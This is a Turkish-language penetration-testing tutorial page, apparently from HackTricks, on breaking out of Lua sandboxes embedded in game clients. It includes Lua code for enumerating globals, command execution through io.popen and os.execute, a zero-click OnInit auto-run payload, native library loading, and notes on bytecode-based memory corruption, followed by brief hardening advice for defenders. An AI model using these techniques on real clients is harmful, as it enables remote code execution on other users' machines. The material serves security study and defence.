# Lua sandbox'larını bypass etme (embedded VM'ler, game client'ları)

{{#include ../../../banners/hacktricks-training.md}}

Bu sayfa, uygulamalara gömülü Lua "sandbox"larını (özellikle game client'ları, plugin'ler veya uygulama içi scripting engine'leri) enumerate etmek ve bunlardan breakout gerçekleştirmek için pratik teknikleri bir araya getirir. Birçok engine kısıtlı bir Lua environment'ı sunar; ancak arbitrary command execution'ı, hatta bytecode loader'ları erişime açıksa native memory corruption'ı mümkün kılan güçlü global'leri erişilebilir bırakır.

Temel fikirler:
- VM'yi bilinmeyen bir environment olarak ele alın: _G'yi enumerate edin ve hangi dangerous primitive'lerin erişilebilir olduğunu keşfedin.
- stdout/print engellendiğinde, sonuçları gözlemlemek için VM içindeki herhangi bir UI/IPC channel'ını output sink olarak abuse edin.
- io/os expose edilmişse genellikle direct command execution elde edersiniz (io.popen, os.execute).
- load/loadstring/loadfile expose edilmişse crafted Lua bytecode çalıştırmak bazı versiyonlarda memory safety'yi subvert edebilir (≤5.1 verifier'ları bypass edilebilir; 5.2 verifier'ı kaldırdı) ve advanced exploitation'ı mümkün kılar.

## Sandboxed environment'ı enumerate etme

- Erişilebilir table/function'ların envanterini çıkarmak için global environment'ı dump edin:
```lua
-- Minimal _G dumper for any Lua sandbox with some output primitive `out`
local function dump_globals(out)
out("=== DUMPING _G ===")
for k, v in pairs(_G) do
out(tostring(k) .. " = " .. tostring(v))
end
end
```
- Kullanılabilir bir print() yoksa, VM içindeki kanalları yeniden amaçlandırın. Sohbet çıktısının yalnızca bir sound çağrısından sonra çalıştığı bir MMO housing script VM örneğinde, aşağıdaki kod güvenilir bir çıktı işlevi oluşturur:<sup>[[1]](#references)</sup>
```lua
-- Build an output channel using in-game primitives
local function ButlerOut(label)
-- Some engines require enabling an audio channel before speaking
H.PlaySound(0, "r[1]") -- quirk: required before H.Say()
return function(msg)
H.Say(label or 1, msg)
end
end

function OnMenu(menuNum)
if menuNum ~= 3 then return end
local out = ButlerOut(1)
dump_globals(out)
end
```
Bu kalıbı hedefiniz için genelleştirin: string kabul eden herhangi bir textbox, toast, logger veya UI callback'i reconnaissance için stdout görevi görebilir.

## io/os exposed ise doğrudan command execution

Sandbox hâlâ standart io veya os kütüphanelerini expose ediyorsa, muhtemelen anında command execution elde edebilirsiniz:
```lua
-- Windows example
io.popen("calc.exe")

-- Cross-platform variants depending on exposure
os.execute("/usr/bin/id")
io.popen("/bin/sh -c 'id'")
```
Notlar:

- Execution client process içinde gerçekleşir; external debugger'ları engelleyen birçok anti-cheat/antidebug katmanı, in-VM process creation işlemini engelleyemez.
- Ayrıca şunları da kontrol edin: package.loadlib (arbitrary DLL/.so loading), native modüllerle birlikte require, mevcutsa LuaJIT'in ffi özelliği ve debug library (VM içinde privileges yükseltebilir).

## auto-run callback'leri üzerinden zero-click trigger'lar

Host application script'leri client'lara gönderiyorsa ve VM auto-run hook'larını (ör. OnInit/OnLoad/OnEnter) expose ediyorsa, script yüklenir yüklenmez drive-by compromise gerçekleştirmek için payload'ınızı buraya yerleştirin:<sup>[[1]](#references)</sup>
```lua
function OnInit()
io.popen("calc.exe") -- or any command
end
```
Herhangi bir eşdeğer callback (OnLoad, OnEnter vb.), script'ler client'a otomatik olarak iletilip çalıştırıldığında bu tekniği genelleştirir.

## Recon sırasında aranacak tehlikeli primitive'ler

_G enumeration sırasında özellikle şunları arayın:
- io, os: io.popen, os.execute, file I/O, env erişimi.
- load, loadstring, loadfile, dofile: source veya bytecode çalıştırır; güvenilmeyen bytecode yüklemeyi destekler.
- package, package.loadlib, require: dinamik library yükleme ve module surface.
- debug: setfenv/getfenv (≤5.1), getupvalue/setupvalue, getinfo ve hook'lar.
- Yalnızca LuaJIT: native code'u doğrudan çağırmak için ffi.cdef, ffi.load.

Minimal kullanım örnekleri (erişilebiliyorsa):
```lua
-- Execute source/bytecode
local f = load("return 1+1")
print(f()) -- 2

-- loadstring is alias of load for strings in 5.1
local bc = string.dump(function() return 0x1337 end)
local g = loadstring(bc) -- in 5.1 may run precompiled bytecode
print(g())

-- Load native library symbol (if allowed)
local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
local foo = mylib()
```
## İsteğe bağlı escalation: Lua bytecode loaders'ı kötüye kullanma

load/loadstring/loadfile erişilebilir ancak io/os kısıtlı olduğunda, hazırlanmış Lua bytecode'un çalıştırılması memory disclosure ve corruption primitive'lerine yol açabilir. Temel bilgiler:
- Lua ≤ 5.1, bilinen bypass'lara sahip bir bytecode verifier ile birlikte sunuluyordu.<sup>[[4]](#references)</sup>
- Lua 5.2, verifier'ı tamamen kaldırdı (resmî yaklaşım: uygulamalar precompiled chunk'ları doğrudan reddetmelidir); bu da bytecode loading yasaklanmamışsa attack surface'i genişletti.<sup>[[2]](#references)[[3]](#references)</sup>
- İş akışları genellikle şunları içerir: in-VM output üzerinden pointer leak etmek, type confusion oluşturacak bytecode hazırlamak (örneğin FORLOOP veya diğer opcode'lar etrafında), ardından arbitrary read/write ya da native code execution elde etmek.<sup>[[2]](#references)[[4]](#references)</sup>

Bu yol engine/version-specific'tir ve RE gerektirir. Ayrıntılı incelemeler, exploitation primitive'leri ve oyunlardaki örnek gadget'lar için references bölümüne bakın.

## Detection ve hardening notları (defenders için)

- Server side: user script'lerini reddedin veya yeniden yazın; safe API'ler için allowlist kullanın; io, os, load/loadstring/loadfile/dofile, package.loadlib, debug ve ffi'yi strip edin veya boş bir binding ile bağlayın.
- Client side: Lua'yı minimal bir _ENV ile çalıştırın, bytecode loading'i yasaklayın, strict bir bytecode verifier veya signature checks'i yeniden uygulayın ve client process'ten process creation'ı engelleyin.
- Telemetry: script load işleminden kısa süre sonra gameclient → child process creation gerçekleştiğinde alert üretin; bunu UI/chat/script event'leriyle ilişkilendirin.

## References

- [1] [This House is Haunted: a decade old RCE in the AION client (housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
- [2] [Bytecode Breakdown: Unraveling Factorio's Lua Security Flaws](https://memorycorruption.net/posts/rce-lua-factorio/)
- [3] [lua-l (2009): Discussion on dropping the bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
- [4] [Exploiting Lua 5.1 bytecode (gist with verifier bypasses/notes)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)

{{#include ../../../banners/hacktricks-training.md}}
